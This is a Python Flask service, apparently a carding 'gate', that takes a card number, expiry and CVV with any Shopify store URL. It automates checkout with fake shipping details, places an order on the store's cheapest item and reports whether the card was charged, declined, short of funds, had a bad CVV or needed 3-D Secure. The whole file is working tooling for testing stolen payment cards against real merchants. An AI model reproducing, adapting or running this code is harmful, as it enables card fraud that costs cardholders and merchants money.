import os
import time
import random
import asyncio
import aiohttp
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

def _ok(response, gate, price, charged, approved, elapsed):
    return {
        "success": charged == "True",
        "Response": response,
        "Gate": gate,
        "Price": f"{price} USD",
        "Charged": charged,
        "Approved": approved,
        "Time": f"{elapsed}s"
    }

def _err(msg, start):
    return {
        "success": False,
        "Response": msg,
        "Gate": "Shopify",
        "Price": "0",
        "Charged": "False",
        "Approved": "False",
        "Time": f"{round(time.time()-start, 1)}s"
    }

def extract_token(html, field='name="authenticity_token"'):
    try:
        return html.split(f'{field} value="')[1].split('"')[0]
    except Exception:
        return ""

async def shopify_check(cc, mm, yy, cvv, site):
    start = time.time()
    site = site.rstrip("/")
    yy_full = yy if len(str(yy)) == 4 else f"20{yy}"

    try:
        timeout = aiohttp.ClientTimeout(total=90)
        connector = aiohttp.TCPConnector(ssl=False)
        jar = aiohttp.CookieJar()

        async with aiohttp.ClientSession(
            headers=HEADERS,
            connector=connector,
            timeout=timeout,
            cookie_jar=jar
        ) as session:

            # Step 1: Get cheapest product variant
            async with session.get(
                f"{site}/products.json?limit=250&sort_by=price-ascending",
                headers={**HEADERS, "Accept": "application/json"}
            ) as resp:
                if resp.status != 200:
                    return _err(f"PRODUCTS_FAILED_{resp.status}", start)
                products = await resp.json(content_type=None)

            if not products.get("products"):
                return _err("NO_PRODUCTS", start)

            # Pick cheapest variant
            cheapest_variant = None
            cheapest_price = float("inf")
            for product in products["products"]:
                for variant in product["variants"]:
                    try:
                        p = float(variant.get("price", "9999"))
                        if p < cheapest_price and p > 0:
                            cheapest_price = p
                            cheapest_variant = variant["id"]
                    except Exception:
                        pass

            if not cheapest_variant:
                cheapest_variant = products["products"][0]["variants"][0]["id"]
                cheapest_price = float(products["products"][0]["variants"][0].get("price", "1.00"))

            price = str(round(cheapest_price, 2))

            # Step 2: Clear cart first
            await session.post(
                f"{site}/cart/clear.js",
                headers={**HEADERS, "Content-Type": "application/json"}
            )

            # Step 3: Add to cart
            async with session.post(
                f"{site}/cart/add.js",
                json={"items": [{"id": cheapest_variant, "quantity": 1}]},
                headers={**HEADERS, "Content-Type": "application/json", "Accept": "application/json"}
            ) as resp:
                if resp.status != 200:
                    return _err(f"CART_FAILED_{resp.status}", start)

            # Step 4: Get checkout
            async with session.get(
                f"{site}/checkout",
                allow_redirects=True,
                headers=HEADERS
            ) as resp:
                checkout_url = str(resp.url)
                checkout_html = await resp.text()

            if "/checkouts/" not in checkout_url:
                return _err("CHECKOUT_FAILED", start)

            # Clean checkout token (remove locale like /en-us)
            checkout_path = checkout_url.split("/checkouts/")[-1]
            checkout_token = re.sub(r'[/?].*$', '', checkout_path)

            base_checkout = f"{site}/checkouts/{checkout_token}"
            auth_token = extract_token(checkout_html)

            # Step 5: Contact info
            email = f"john{random.randint(10000,99999)}@gmail.com"
            contact_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": email,
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Smith",
                "checkout[shipping_address][address1]": "123 Main St",
                "checkout[shipping_address][address2]": "",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "2125551234",
            }

            async with session.post(
                base_checkout,
                data=contact_payload,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded", "Referer": checkout_url}
            ) as resp:
                shipping_html = await resp.text()
                shipping_url = str(resp.url)

            auth_token = extract_token(shipping_html) or auth_token

            # Extract shipping rate
            shipping_rate = ""
            match = re.search(r'data-shipping-method="([^"]+)"', shipping_html)
            if match:
                shipping_rate = match.group(1)
            else:
                # Try input value
                match = re.search(r'name="checkout\[shipping_rate\]\[id\]"[^>]*value="([^"]+)"', shipping_html)
                if match:
                    shipping_rate = match.group(1)

            if not shipping_rate:
                shipping_rate = "shopify-Standard Shipping-0.00"

            # Step 6: Shipping method
            shipping_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "checkout[shipping_rate][id]": shipping_rate,
            }

            async with session.post(
                base_checkout,
                data=shipping_payload,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded", "Referer": shipping_url}
            ) as resp:
                payment_html = await resp.text()
                payment_url = str(resp.url)

            auth_token = extract_token(payment_html) or auth_token

            # Detect gateway
            gateway = "Shopify Payments"
            if "stripe" in payment_html.lower():
                gateway = "Stripe"
            elif "braintree" in payment_html.lower():
                gateway = "Braintree"

            # Extract payment gateway ID
            gateway_id = ""
            match = re.search(r'"payment-gateway" value="(\d+)"', payment_html)
            if match:
                gateway_id = match.group(1)

            # Extract total price
            total_match = re.search(r'"total_price"\s*:\s*"?(\d+)"?', payment_html)
            if total_match:
                try:
                    price = str(round(int(total_match.group(1)) / 100, 2))
                except Exception:
                    pass

            # Step 7: Submit payment
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "checkout[credit_card][number]": cc,
                "checkout[credit_card][name]": "John Smith",
                "checkout[credit_card][month]": mm,
                "checkout[credit_card][year]": yy_full,
                "checkout[credit_card][verification_value]": cvv,
                "checkout[payment_gateway]": gateway_id,
                "checkout[total_price]": "",
                "complete": "1",
            }

            async with session.post(
                base_checkout,
                data=payment_payload,
                allow_redirects=True,
                headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded", "Referer": payment_url}
            ) as resp:
                result_url = str(resp.url)
                result_text = await resp.text()

            # If redirect to locale page with no body, fetch again
            if len(result_text.strip()) < 100:
                async with session.get(result_url, allow_redirects=True) as resp2:
                    result_url = str(resp2.url)
                    result_text = await resp2.text()

            elapsed = round(time.time() - start, 1)
            rl = result_text.lower()
            ru = result_url.lower()

            # Parse result
            if "thank_you" in ru or "thank-you" in ru or "/orders/" in ru:
                return _ok("ORDER_PLACED", gateway, price, "True", "True", elapsed)
            elif "insufficient_funds" in rl or "insufficient funds" in rl:
                return _ok("INSUFFICIENT_FUNDS", gateway, price, "False", "True", elapsed)
            elif "do_not_honor" in rl or "do not honor" in rl:
                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
            elif "3d_secure" in rl or "3d secure" in rl or "authentication_required" in rl or "authenticate your" in rl:
                return _ok("3DS_REQUIRED", gateway, price, "False", "False", elapsed)
            elif "your card was declined" in rl or "card_declined" in rl or "card has been declined" in rl or "card was declined" in rl:
                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
            elif "security code" in rl or "security_code" in rl:
                return _ok("INVALID_CVV", gateway, price, "False", "False", elapsed)
            elif "expir" in rl and "card" in rl:
                return _ok("INVALID_EXPIRY", gateway, price, "False", "False", elapsed)
            elif "step=payment_method" in ru or (("payment" in ru or "checkouts" in ru) and "thank" not in ru):
                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
            else:
                snippet = result_text[500:800].replace("\n", " ")[:100]
                return _ok(f"UNKNOWN|{ru[:80]}|{snippet}", gateway, price, "False", "False", elapsed)

    except asyncio.TimeoutError:
        return _err("TIMEOUT", start)
    except Exception as e:
        return _err(f"ERROR_{str(e)[:50]}", start)


@app.route("/", methods=["GET"])
def check():
    card = request.args.get("card", "")
    site = request.args.get("site", "")

    if not card:
        return jsonify({"success": False, "message": "Missing card parameter. Use: ?card=CC|MM|YYYY|CVV"})
    if not site:
        return jsonify({"success": False, "message": "Missing site parameter. Use: &site=https://store.myshopify.com"})

    parts = card.split("|")
    if len(parts) != 4:
        return jsonify({"success": False, "message": "Invalid card format. Use: CC|MM|YYYY|CVV"})

    cc, mm, yy, cvv = parts

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(shopify_check(cc, mm, yy, cvv, site))
    finally:
        loop.close()

    return jsonify(result)


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "message": "Shopify Node Running"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
